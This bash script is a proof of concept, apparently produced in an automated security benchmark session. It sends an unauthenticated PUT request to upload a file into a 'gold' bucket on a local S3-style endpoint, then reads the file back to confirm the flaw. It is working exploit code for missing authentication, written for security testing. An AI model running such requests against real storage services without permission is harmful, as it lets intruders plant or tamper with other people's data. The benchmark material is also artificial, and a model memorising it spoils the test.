#!/bin/bash
# POC: Demonstrates unauthenticated file upload to S3 gold bucket via PUT request without authentication
# Target: ./repo
# Created: 2025-11-07T16:12:42.057Z
# Session: benchmark-XBEN-084-24-mhp1efma

# S3 Unauthenticated File Upload POC
# Demonstrates ability to upload files to S3 buckets without authentication

TARGET_URL="http://localhost:3000"
BUCKET="gold"
FILE_NAME="secret_$(date +%s).txt"
TEST_DATA="test_upload_data_$(date +%s)"

echo "[*] S3 Unauthenticated File Upload POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Bucket: $BUCKET"
echo "[*] Filename: $FILE_NAME"
echo ""

# Step 1: Attempt unauthenticated PUT request to upload file
echo "[*] Step 1: Attempting unauthenticated PUT request to upload file..."
UPLOAD_RESPONSE=$(curl -s -w "\n%{http_code}" -X PUT \
  "$TARGET_URL/s3/$BUCKET/$FILE_NAME" \
  -H "Content-Type: application/json" \
  -d "{\"data\":\"$TEST_DATA\"}")

HTTP_CODE=$(echo "$UPLOAD_RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$UPLOAD_RESPONSE" | sed '$d')

echo "[*] HTTP Status Code: $HTTP_CODE"
echo "[*] Response Body: $RESPONSE_BODY"
echo ""

# Check if upload was successful (200 or 201)
if [[ "$HTTP_CODE" == "200" || "$HTTP_CODE" == "201" ]]; then
    echo "[+] SUCCESS: File uploaded successfully (HTTP $HTTP_CODE)"
    echo "[+] Upload successful without authentication required"
    
    # Step 2: Verify file exists by attempting to retrieve it
    echo ""
    echo "[*] Step 2: Verifying uploaded file by attempting retrieval..."
    RETRIEVE_RESPONSE=$(curl -s -w "\n%{http_code}" -X GET \
      "$TARGET_URL/s3/$BUCKET/$FILE_NAME")
    
    RETRIEVE_CODE=$(echo "$RETRIEVE_RESPONSE" | tail -n1)
    RETRIEVE_BODY=$(echo "$RETRIEVE_RESPONSE" | sed '$d')
    
    echo "[*] Retrieval HTTP Status Code: $RETRIEVE_CODE"
    
    if [[ "$RETRIEVE_CODE" == "200" ]]; then
        echo "[+] SUCCESS: File retrieved successfully"
        echo "[+] File content/response: $RETRIEVE_BODY"
        echo ""
        echo "[+] VULNERABILITY CONFIRMED: Unauthenticated file upload and retrieval successful"
        exit 0
    else
        echo "[!] File retrieval returned HTTP $RETRIEVE_CODE"
        echo "[+] However, upload was successful - vulnerability confirmed"
        exit 0
    fi
else
    echo "[-] FAILED: Upload returned HTTP $HTTP_CODE"
    echo "[-] Response: $RESPONSE_BODY"
    exit 1
fi